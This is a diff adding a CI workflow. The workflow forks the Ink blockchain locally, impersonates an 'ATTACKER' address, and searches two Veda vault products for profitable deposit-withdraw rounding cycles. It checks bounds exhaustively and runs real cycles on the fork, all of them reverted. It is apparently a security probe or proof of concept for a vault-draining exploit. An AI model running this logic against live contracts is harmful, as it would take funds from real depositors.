@@ -1,0 +1,161 @@
+name: veda-ink-roundtrip
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 18
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Start local Ink fork
+        shell: bash
+        run: |
+          set -euo pipefail
+          anvil --fork-url https://rpc-gel.inkonchain.com --port 8545 --silent >anvil-ink.log 2>&1 &
+          echo $! > anvil.pid
+          for _ in $(seq 1 90); do
+            if cast chain-id --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1; then exit 0; fi
+            sleep 1
+          done
+          cat anvil-ink.log
+          exit 1
+      - name: Prove live fixed-rate bounds and execute real deposit-withdraw cycles
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, subprocess, time, traceback, urllib.request
+
+          RPC="http://127.0.0.1:8545"
+          ATTACKER="0x1111111111111111111111111111111111111111"
+          ZERO="0x0000000000000000000000000000000000000000"
+          PRODUCTS={
+            "balanced":{"vault":"0xcaae49fb7f74cCFBE8A05E6104b01c097a78789f","accountant":"0x0C4dF79d9e35E5C4876BC1aE4663E834312DDc67","teller":"0xC151E263d5c890FD0Bceb33a6525F1A76a8329fC","one":10**6},
+            "boosted":{"vault":"0xDbD87325D7b1189Dcc9255c4926076fF4a96A271","accountant":"0x9c2477D4Ea17d3cCC45e6b1087c94d14926F54C9","teller":"0xc46f2443b3521632E2E2a903D6da8f965B46f6a0","one":10**6},
+          }
+          def shell(*args):
+            proc=subprocess.run([str(x) for x in args],text=True,capture_output=True)
+            if proc.returncode:raise RuntimeError({"args":args,"stdout":proc.stdout,"stderr":proc.stderr})
+            return proc.stdout.strip()
+          SIG={name:shell("cast","sig",signature) for name,signature in {
+            "base":"base()","rate":"getRate()","quote":"getRateInQuoteSafe(address)","pending":"getPendingVestingGains()","unvested":"getPendingUnvestedGains()",
+            "vesting":"vestingState()","supplyObservation":"supplyObservation()","totalAssets":"totalAssets()","lastVirtual":"lastVirtualSharePrice()",
+            "assetData":"assetData(address)","shareLock":"shareLockPeriod()","isPaused":"isPaused()","vault":"vault()","accountant":"accountant()",
+            "balance":"balanceOf(address)","totalSupply":"totalSupply()","decimals":"decimals()","approve":"approve(address,uint256)","transfer":"transfer(address,uint256)",
+            "deposit":"deposit(address,uint256,uint256,address)","withdraw":"withdraw(address,uint256,uint256,address)",
+          }.items()}
+          def rpc(method,params,timeout=60):
+            body=json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode();request=urllib.request.Request(RPC,data=body,method="POST",headers={"content-type":"application/json","user-agent":"veda-ink-roundtrip/1"})
+            with urllib.request.urlopen(request,timeout=timeout) as response:payload=json.loads(response.read().decode())
+            if "error" in payload:raise RuntimeError({"method":method,"error":payload["error"]})
+            return payload["result"]
+          def strip0(value):
+            text=str(value or "");return text[2:] if text.startswith("0x") else text
+          def aw(address):return strip0(address).lower().rjust(64,"0")
+          def uw(value):return hex(int(value))[2:].rjust(64,"0")
+          def words(raw):
+            value=strip0(raw);return [int(value[i:i+64],16) for i in range(0,len(value),64)] if value and len(value)%64==0 else []
+          def decode_address(raw):return "0x"+strip0(raw)[-40:].lower()
+          def call(to,data,from_address=None):
+            tx={"to":to,"data":data}
+            if from_address:tx["from"]=from_address
+            return rpc("eth_call",[tx,"latest"])
+          def call_uint(to,data):return int(call(to,data),16)
+          def balance(token,user):return call_uint(token,SIG["balance"]+aw(user))
+          def send(sender,to,data,value=0):
+            tx={"from":sender,"to":to,"data":data,"gas":hex(15_000_000)}
+            if value:tx["value"]=hex(value)
+            tx_hash=rpc("eth_sendTransaction",[tx])
+            for _ in range(300):
+              receipt=rpc("eth_getTransactionReceipt",[tx_hash])
+              if receipt:
+                if int(receipt["status"],16)!=1:raise RuntimeError({"failed_tx":tx_hash,"receipt":receipt})
+                return receipt
+              time.sleep(.04)
+            raise RuntimeError("receipt timeout")
+          def calldata(signature,*args):return shell("cast","calldata",signature,*[str(value) for value in args])
+          def snapshot():return rpc("evm_snapshot",[])
+          def revert(snap):return rpc("evm_revert",[snap])
+          def mine_after(seconds):
+            rpc("evm_increaseTime",[int(seconds)]);rpc("evm_mine",[])
+          def state(product):
+            accountant=product["accountant"];vault=product["vault"]
+            return {"timestamp":int(rpc("eth_getBlockByNumber",["latest",False])["timestamp"],16),"rate":call_uint(accountant,SIG["rate"]),"pending":call_uint(accountant,SIG["pending"]),"unvested":call_uint(accountant,SIG["unvested"]),"total_assets":call_uint(accountant,SIG["totalAssets"]),"last_virtual":call_uint(accountant,SIG["lastVirtual"]),"vesting":words(call(accountant,SIG["vesting"])),"supply_observation":words(call(accountant,SIG["supplyObservation"])),"total_supply":call_uint(vault,SIG["totalSupply"])}
+          rpc("anvil_impersonateAccount",[ATTACKER]);rpc("anvil_setBalance",[ATTACKER,hex(1000*10**18)])
+          output={"block":int(rpc("eth_blockNumber",[]),16),"products":{},"positive_fixed_rate_bounds":[],"positive_actual_cycles":[],"errors":[]}
+          for name,product in PRODUCTS.items():
+            row={};output["products"][name]=row
+            try:
+              base=decode_address(call(product["accountant"],SIG["base"]));quote=call_uint(product["accountant"],SIG["quote"]+aw(base));asset_data=words(call(product["teller"],SIG["assetData"]+aw(base)));share_lock=call_uint(product["teller"],SIG["shareLock"]);base_decimals=call_uint(base,SIG["decimals"]);vault_base=balance(base,product["vault"])
+              row.update({"base":base,"base_decimals":base_decimals,"quote":quote,"asset_data":asset_data,"share_lock_period":share_lock,"vault_base_balance":vault_base,"initial_state":state(product)})
+              # Exhaustive fixed-rate integer proof: deposit uses quote+1, withdraw uses quote.
+              candidates=set(range(1,1_000_001))
+              for share_boundary in range(1,1_000_001):
+                amount=(share_boundary*(quote+1)+product["one"]-1)//product["one"]
+                candidates.update((max(1,amount-1),amount,amount+1))
+              candidates.update(max(1,vault_base+delta) for delta in range(-100,101))
+              best=None
+              for amount in candidates:
+                shares=amount*product["one"]//(quote+1)
+                amount_out=shares*quote//product["one"]
+                profit=amount_out-amount
+                if best is None or profit>best[0]:best=(profit,amount,shares,amount_out)
+              row["fixed_rate_best"]={"profit":best[0],"input":best[1],"shares":best[2],"output":best[3],"candidate_count":len(candidates)}
+              if best[0]>0:output["positive_fixed_rate_bounds"].append({"product":name,**row["fixed_rate_best"]})
+              # Use the vault only as local-fork setup fund source; baseline is taken after seeding.
+              test_amounts=sorted(set([10**base_decimals,1000*10**base_decimals,max(1,min(vault_base//1000,100_000*10**base_decimals))]))
+              cycles=[]
+              for amount in test_amounts:
+                if amount<=0 or amount>=vault_base:continue
+                snap=snapshot()
+                try:
+                  rpc("anvil_impersonateAccount",[product["vault"]]);rpc("anvil_setBalance",[product["vault"],hex(1000*10**18)])
+                  send(product["vault"],base,calldata("transfer(address,uint256)",ATTACKER,amount))
+                  baseline={"attacker_base":balance(base,ATTACKER),"vault_base":balance(base,product["vault"]),"attacker_shares":balance(product["vault"],ATTACKER),"state":state(product)}
+                  send(ATTACKER,base,calldata("approve(address,uint256)",product["vault"],0));send(ATTACKER,base,calldata("approve(address,uint256)",product["vault"],amount))
+                  preview=int(call(product["teller"],calldata("deposit(address,uint256,uint256,address)",base,amount,0,ZERO),ATTACKER),16)
+                  deposit_receipt=send(ATTACKER,product["teller"],calldata("deposit(address,uint256,uint256,address)",base,amount,0,ZERO))
+                  after_deposit={"attacker_base":balance(base,ATTACKER),"vault_base":balance(base,product["vault"]),"attacker_shares":balance(product["vault"],ATTACKER),"state":state(product)}
+                  minted=after_deposit["attacker_shares"]-baseline["attacker_shares"]
+                  mine_after(share_lock+1)
+                  before_withdraw={"attacker_base":balance(base,ATTACKER),"vault_base":balance(base,product["vault"]),"attacker_shares":balance(product["vault"],ATTACKER),"state":state(product)}
+                  withdraw_preview=int(call(product["teller"],calldata("withdraw(address,uint256,uint256,address)",base,minted,0,ATTACKER),ATTACKER),16)
+                  withdraw_receipt=send(ATTACKER,product["teller"],calldata("withdraw(address,uint256,uint256,address)",base,minted,0,ATTACKER))
+                  final={"attacker_base":balance(base,ATTACKER),"vault_base":balance(base,product["vault"]),"attacker_shares":balance(product["vault"],ATTACKER),"state":state(product)}
+                  profit=final["attacker_base"]-baseline["attacker_base"]
+                  protocol_incremental=final["vault_base"]-baseline["vault_base"]
+                  newly_vested=max(0,before_withdraw["state"]["rate"]*before_withdraw["state"]["total_supply"]//product["one"]-after_deposit["state"]["rate"]*after_deposit["state"]["total_supply"]//product["one"])
+                  cycle={"amount":amount,"setup_source":"vault_local_fork_only","deposit_preview":preview,"withdraw_preview":withdraw_preview,"minted_shares":minted,"profit_base_units":profit,"vault_incremental_base_units":protocol_incremental,"share_lock_wait":share_lock+1,"newly_vested_estimate":newly_vested,"deposit_gas":int(deposit_receipt["gasUsed"],16),"withdraw_gas":int(withdraw_receipt["gasUsed"],16),"baseline":baseline,"after_deposit":after_deposit,"before_withdraw":before_withdraw,"final":final}
+                  cycles.append(cycle)
+                  if profit>0:output["positive_actual_cycles"].append({"product":name,"amount":amount,"profit":profit,"newly_vested_estimate":newly_vested})
+                except Exception as exc:
+                  cycles.append({"amount":amount,"error":repr(exc),"traceback":traceback.format_exc()})
+                finally:
+                  revert(snap)
+              row["cycles"]=cycles
+            except Exception as exc:
+              row["error"]=repr(exc);row["traceback"]=traceback.format_exc();output["errors"].append({"product":name,"error":repr(exc)})
+          output["summary"]={"positive_fixed_rate_count":len(output["positive_fixed_rate_bounds"]),"positive_actual_cycle_count":len(output["positive_actual_cycles"]),"errors":len(output["errors"])}
+          with open("veda-ink-roundtrip.json","w",encoding="utf-8") as handle:json.dump(output,handle,indent=2,sort_keys=True);handle.write("\n")
+          print(json.dumps({"summary":output["summary"],"positive_fixed":output["positive_fixed_rate_bounds"],"positive_actual":output["positive_actual_cycles"],"products":{name:{"base":row.get("base"),"quote":row.get("quote"),"asset_data":row.get("asset_data"),"share_lock":row.get("share_lock_period"),"fixed_rate_best":row.get("fixed_rate_best"),"cycles":[{key:value for key,value in cycle.items() if key not in ("baseline","after_deposit","before_withdraw","final","traceback")} for cycle in row.get("cycles",[])]} for name,row in output["products"].items()},"errors":output["errors"]},indent=2,sort_keys=True))
+          PY
+      - name: Stop fork
+        if: always()
+        run: kill "$(cat anvil.pid)" 2>/dev/null || true
+      - name: Upload Ink roundtrip proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: veda-ink-roundtrip
+          path: |
+            veda-ink-roundtrip.json
+            anvil-ink.log
+          if-no-files-found: error
+          retention-days: 1
